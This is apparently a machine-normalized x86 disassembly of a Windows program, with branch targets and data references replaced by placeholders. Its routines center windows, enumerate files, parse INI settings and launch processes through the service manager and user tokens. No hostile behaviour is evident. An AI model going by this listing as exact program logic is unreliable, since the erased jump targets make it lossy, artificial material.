call [ GetWindowRect@IAT ]
push 0x6
mov edx [ ebp - 0x9c0 ]
sub edx [ ebp - 0x9c8 ]
add edx [ ebp - 0x9a8 ]
push edx
mov eax [ ebp - 0x9c4 ]
sub eax [ ebp - 0x9cc ]
add eax [ ebp - 0x9ac ]
push eax
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x1c ]
push ecx
call [ SetWindowPos@IAT ]
lea edx [ ebp - 0x9dc ]
push edx
mov eax [ ebp - 0x18 ]
push eax
call [ GetWindowRect@IAT ]
push 0x6
mov ecx [ ebp - 0x9d0 ]
sub ecx [ ebp - 0x9d8 ]
push ecx
mov edx [ ebp - 0x9d4 ]
sub edx [ ebp - 0x9dc ]
add edx [ ebp - 0x9ac ]
push edx
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call [ SetWindowPos@IAT ]
lea ecx [ ebp - 0x9ec ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x9ec ]
mov [ ebp - 0x9f4 ] eax
mov ecx [ ebp - 0x9e8 ]
mov [ ebp - 0x9f0 ] ecx
lea edx [ ebp - 0x9f4 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
call [ GetParent@IAT ]
push eax
call [ ScreenToClient@IAT ]
push 0x5
push 0x0
push 0x0
mov ecx [ ebp - 0x9f0 ]
add ecx [ ebp - 0x9a8 ]
push ecx
mov edx [ ebp - 0x9f4 ]
push edx
push 0x0
mov eax [ ebp - 0x18 ]
push eax
call [ SetWindowPos@IAT ]
cmp [ ebp - 0x9a8 ] 0x0
jle r-xdata
sub_408030
push ebp
mov ebp esp
sub esp 0x34
call [ GetDesktopWindow@IAT ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call [ GetWindowRect@IAT ]
lea edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ GetWindowRect@IAT ]
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call [ CopyRect@IAT ]
mov eax [ ebp - 0x20 ]
neg eax
push eax
mov ecx [ ebp - 0x24 ]
neg ecx
push ecx
lea edx [ ebp - 0x24 ]
push edx
call [ OffsetRect@IAT ]
mov eax [ ebp - 0xc ]
neg eax
push eax
mov ecx [ ebp - 0x10 ]
neg ecx
push ecx
lea edx [ ebp - 0x10 ]
push edx
call [ OffsetRect@IAT ]
mov eax [ ebp - 0x18 ]
neg eax
push eax
mov ecx [ ebp - 0x1c ]
neg ecx
push ecx
lea edx [ ebp - 0x10 ]
push edx
call [ OffsetRect@IAT ]
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0x34 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ SetWindowPos@IAT ]
mov esp ebp
pop ebp
retn
sub_408100
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xffffffff
push 0x208
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call sub_412f80
add esp 0xc
push 0x104
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_4134a9
add esp 0xc
mov ecx [ ebp - 0x4 ]
add ecx 0x4
push ecx
call sub_411794
add esp 0x4
mov edx 0x104
sub edx eax
sub edx 0x1
push edx
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_415b7b
add esp 0xc
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_408180
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call [ FindClose@IAT ]
sub_4081c0
push ebp
mov ebp esp
sub esp 0x8
push 0x20c
call sub_412ddb
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_408100
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_408200
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_408240
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
sub_408240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_408180
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_41226d
add esp 0x4
sub_408270
push ebp
mov ebp esp
sub esp 0x25c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
je r-xdata
lea ecx [ ebp - 0x258 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x4
push edx
call [ FindFirstFileW@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x258 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ FindNextFileW@IAT ]
mov [ ebp - 0x25c ] eax
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
push 0x208
push 0x0
push rw-data
call sub_412f80
add esp 0xc
push 0x104
lea eax [ ebp - 0x22c ]
push eax
push rw-data
call sub_4134a9
add esp 0xc
mov eax rw-data
call [ GetLastError@IAT ]
cmp eax 0x2
jne r-xdata
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119bb
mov [ eax ] 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
xor eax eax
jmp r-xdata
sub_408360
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x214 ] ecx
mov eax [ ebp - 0x214 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
push 0x104
lea edx [ ebp - 0x210 ]
push edx
call sub_401540
add esp 0x14
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
movzx ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x210 ]
push eax
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x218 ] r--data
mov [ ebp - 0x218 ] r--data
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push r--data
push 0x104
lea eax [ ebp - 0x210 ]
push eax
call sub_401540
add esp 0x14
mov edx [ ebp - 0x218 ]
push edx
lea eax [ ebp - 0x210 ]
push eax
call sub_412b5e
add esp 0x8
mov ecx [ ebp - 0x214 ]
mov [ ecx ] eax
sub_408440
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_412a1c
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_408470
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_415e69
add esp 0xc
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4084b0
push ebp
mov ebp esp
sub esp 0x54
push r--data
mov eax [ ebp + 0x8 ]
push eax
call sub_412b5e
add esp 0x8
push eax
lea ecx [ ebp - 0xc ]
call sub_402750
lea ecx [ ebp - 0xc ]
call sub_4027d0
test eax eax
jne r-xdata
push 0x2
push 0x0
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x3c ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x3c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
call sub_416025
add esp 0x4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
mov [ ebp - 0x40 ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x40 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
push edx
lea ecx [ ebp - 0x8 ]
call sub_4087e0
lea ecx [ ebp - 0x8 ]
call sub_4027d0
test eax eax
jne r-xdata
mov [ ebp - 0x44 ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x44 ]
jmp r-xdata
push 0x0
push 0x0
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x48 ] 0xa
lea ecx [ ebp - 0x8 ]
call sub_408810
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
mov eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_4027d0
push eax
call sub_412518
add esp 0x10
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
je r-xdata
mov [ ebp - 0x4c ] 0x6
lea ecx [ ebp - 0x8 ]
call sub_408810
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x4c ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4027d0
mov edx [ ebp - 0x20 ]
mov [ eax + edx ] 0x0
lea ecx [ ebp - 0x8 ]
call sub_4027d0
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x50 ] 0x6
lea ecx [ ebp - 0x8 ]
call sub_408810
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0x10 ]
neg ecx
sbb ecx ecx
and ecx 0x5
mov [ ebp - 0x54 ] ecx
lea ecx [ ebp - 0x8 ]
call sub_408810
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx ]
cmp edx 0x23
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx [ eax ]
cmp ecx 0x3b
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push r--data
call sub_408890
add esp 0x8
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
push edx
push r--data
call sub_408840
add esp 0x8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x24 ]
movsx eax [ edx ]
cmp eax 0x5b
jne r-xdata
jmp r-xdata
movzx edx [ ebp - 0xd ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x34 ] edx
lea eax [ ebp - 0x24 ]
push eax
push r--data
call sub_408890
add esp 0x8
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
push r--data
call sub_408890
add esp 0x8
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0xd ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push r--data
call sub_408890
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_408950
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
jl r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push r--data
mov ecx [ ebp - 0x34 ]
push ecx
call sub_415980
add esp 0x8
neg eax
sbb eax eax
add eax 0x1
mov [ ebp - 0xd ] al
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp - 0x34 ]
push eax
call sub_415980
add esp 0x8
neg eax
sbb eax eax
add eax 0x1
mov [ ebp - 0xd ] al
jmp r-xdata
push 0x257
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp - 0x2c ]
imul eax eax 0x258
add eax [ ebp + 0x14 ]
push eax
call sub_413d20
add esp 0xc
mov ecx [ ebp - 0x2c ]
imul ecx ecx 0x258
mov edx [ ebp + 0x14 ]
mov [ edx + ecx + 0x257 ] 0x0
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_4087e0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_412ddb
add esp 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_408810
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_41226d
add esp 0x4
mov esp ebp
pop ebp
retn
sub_408840
push ebp
mov ebp esp
push ecx
mov edx [ ebp - 0x4 ]
movsx eax [ edx ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx ecx [ eax ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
movsx edx [ ecx ]
mov eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp edx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_408890
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_408840
add esp 0x8
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movsx edx [ ecx ]
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
movsx eax [ edx ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
mov eax [ ebp - 0xc ]
movsx ecx [ eax ]
cmp edx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_408950
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_415980
add esp 0x8
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edx
call sub_412e40
add esp 0x4
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je r-xdata
sub_4089c0
push ebp
mov ebp esp
sub esp 0x4c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4c4 ] 0x2
mov [ ebp - 0x4bc ] r--data
push 0x0
lea eax [ ebp - 0x4b8 ]
push eax
push 0x2
mov ecx [ ebp - 0x4bc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4084b0
add esp 0x14
mov [ ebp - 0x4c0 ] eax
push 0x257
lea eax [ ebp - 0x4b8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_413d20
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ edx + 0x257 ] 0x0
push 0x257
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp + 0xc ]
add ecx 0x258
push ecx
call sub_413d20
add esp 0xc
mov edx [ ebp + 0xc ]
mov [ edx + 0x4af ] 0x0
mov eax [ ebp - 0x4c0 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_408a70
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0xc ]
push eax
call sub_411794
add esp 0x4
cmp eax 0x104
jb r-xdata
push 0x104
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4134a9
add esp 0xc
mov eax [ ebp + 0x8 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_411794
add esp 0x4
mov esi eax
mov edx [ ebp + 0x10 ]
push edx
call sub_411794
add esp 0x4
add esi eax
cmp esi 0x104
jb r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4092b0
add esp 0x8
xor eax eax
jmp r-xdata
sub_408af0
push ebp
mov ebp esp
sub esp 0xf14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor eax eax
mov [ ebp - 0xca8 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0xca6 ]
push ecx
call sub_412f80
add esp 0xc
push 0x104
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0xca8 ]
push eax
call sub_4134a9
add esp 0xc
xor ecx ecx
mov [ ebp - 0xa98 ] cx
push 0x208
push 0x0
lea edx [ ebp - 0xa96 ]
push edx
call sub_412f80
add esp 0xc
push 0x104
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xa98 ]
push ecx
call sub_4134a9
add esp 0xc
push r--data
lea edx [ ebp - 0xa98 ]
push edx
call sub_4092b0
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x641 ] 0x1
lea eax [ ebp - 0xa98 ]
push eax
push 0x105
lea ecx [ ebp - 0x640 ]
push ecx
push 0x0
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0xa98 ]
push edx
push 0x105
lea eax [ ebp - 0xf00 ]
push eax
push 0x0
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xa98 ]
push ecx
push 0xa
lea edx [ ebp - 0xf14 ]
push edx
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x430 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0x42e ]
push ecx
call sub_412f80
add esp 0xc
push 0x104
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x430 ]
push eax
call sub_4134a9
add esp 0xc
lea ecx [ ebp - 0x640 ]
push ecx
lea edx [ ebp - 0x430 ]
push edx
call sub_4092b0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x430 ]
push eax
lea ecx [ ebp - 0x868 ]
push ecx
call sub_408a70
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov [ ebp - 0x218 ] dx
push 0x208
push 0x0
lea eax [ ebp - 0x216 ]
push eax
call sub_412f80
add esp 0xc
push 0x104
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
call sub_4134a9
add esp 0xc
push r--data
lea eax [ ebp - 0x218 ]
push eax
call sub_4092b0
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x888 ] cx
xor edx edx
mov [ ebp - 0x886 ] edx
mov [ ebp - 0x882 ] edx
mov [ ebp - 0x87e ] edx
mov [ ebp - 0x87a ] edx
mov [ ebp - 0x876 ] edx
mov [ ebp - 0x872 ] edx
mov [ ebp - 0x86e ] dx
push 0xd
push r--data
lea eax [ ebp - 0x888 ]
push eax
call sub_4134a9
add esp 0xc
lea ecx [ ebp - 0xf00 ]
push ecx
call sub_411794
add esp 0x4
mov esi eax
lea edx [ ebp - 0x888 ]
push edx
call sub_411794
add esp 0x4
add esi eax
mov [ ebp - 0x658 ] esi
mov eax [ ebp - 0x658 ]
lea ecx [ eax + eax + 0x2 ]
push ecx
call sub_412584
add esp 0x4
mov [ ebp - 0x86c ] eax
cmp [ ebp - 0x86c ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x658 ]
push edx
lea eax [ ebp - 0x888 ]
push eax
mov ecx [ ebp - 0x86c ]
push ecx
call sub_4134a9
add esp 0xc
lea edx [ ebp - 0xf00 ]
push edx
mov eax [ ebp - 0x86c ]
push eax
call sub_412d24
add esp 0x8
movzx ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x641 ] 0x0
push 0x6
push r--data
lea edx [ ebp - 0xf14 ]
push edx
call sub_41617d
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x654 ]
push eax
lea ecx [ ebp - 0xcf0 ]
push ecx
lea edx [ ebp - 0xca8 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x86c ]
push eax
lea ecx [ ebp - 0x430 ]
push ecx
call [ CreateProcessW@IAT ]
test eax eax
setne dl
mov [ ebp - 0x219 ] dl
lea edx [ ebp - 0x654 ]
push edx
lea eax [ ebp - 0xcf0 ]
push eax
lea ecx [ ebp - 0xca8 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x86c ]
push edx
lea eax [ ebp - 0x430 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
call [ CreateProcessAsUserW@IAT ]
test eax eax
setne dl
mov [ ebp - 0x219 ] dl
jmp r-xdata
push 0x2
push r--data
lea eax [ ebp - 0xf14 ]
push eax
call sub_41617d
add esp 0xc
test eax eax
jne r-xdata
movzx eax [ ebp - 0x219 ]
movzx edx [ ebp - 0x641 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x86c ]
push eax
call sub_4121b5
add esp 0x4
movzx ecx [ ebp - 0x219 ]
test ecx ecx
je r-xdata
push 0x0
lea ecx [ ebp - 0x868 ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
call [ CopyFileW@IAT ]
mov [ ebp - 0xcf0 ] 0x44
mov [ ebp - 0xcec ] 0x0
push 0x3c
push 0x0
lea eax [ ebp - 0xce8 ]
push eax
call sub_412f80
add esp 0xc
mov [ ebp - 0xce8 ] r--data
mov [ ebp - 0x654 ] 0x0
xor ecx ecx
mov [ ebp - 0x650 ] ecx
mov [ ebp - 0x64c ] ecx
mov [ ebp - 0x648 ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x654 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x650 ]
push edx
call [ CloseHandle@IAT ]
push 0xffffffff
mov eax [ ebp - 0x654 ]
push eax
call [ WaitForSingleObject@IAT ]
sub_408f60
push ebp
mov ebp esp
sub esp 0x300
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0xc ] eax
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0xf01ff
push r--data
mov eax [ ebp - 0x8 ]
push eax
call [ OpenServiceW@IAT ]
mov [ ebp - 0x234 ] eax
cmp [ ebp - 0x234 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x234 ]
push edx
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x8 ]
push eax
call [ CloseServiceHandle@IAT ]
mov [ ebp - 0x300 ] 0x0
push 0x40
push 0x0
lea ecx [ ebp - 0x2fc ]
push ecx
call sub_412f80
add esp 0xc
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2f8 ] r--data
mov [ ebp - 0x230 ] 0x0
xor edx edx
mov [ ebp - 0x22c ] edx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x224 ] edx
xor eax eax
mov [ ebp - 0x220 ] ax
push 0x208
push 0x0
lea ecx [ ebp - 0x21e ]
push ecx
call sub_412f80
add esp 0xc
push 0x104
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x220 ]
push eax
call sub_4134a9
add esp 0xc
push r--data
lea ecx [ ebp - 0x220 ]
push ecx
call sub_4092b0
add esp 0x8
xor edx edx
mov [ ebp - 0x2b8 ] dx
push 0x7e
push 0x0
lea eax [ ebp - 0x2b6 ]
push eax
call sub_412f80
add esp 0xc
push 0x3f
push r--data
lea ecx [ ebp - 0x2b8 ]
push ecx
call sub_4134a9
add esp 0xc
lea edx [ ebp - 0x230 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x2b8 ]
push edx
lea eax [ ebp - 0x220 ]
push eax
call [ CreateProcessW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
call [ CloseServiceHandle@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x230 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x22c ]
push edx
call [ CloseHandle@IAT ]
sub_409110
push ebp
mov ebp esp
sub esp 0x1c
push 0x5
push r--data
call sub_409400
add esp 0x8
mov [ ebp - 0x18 ] eax
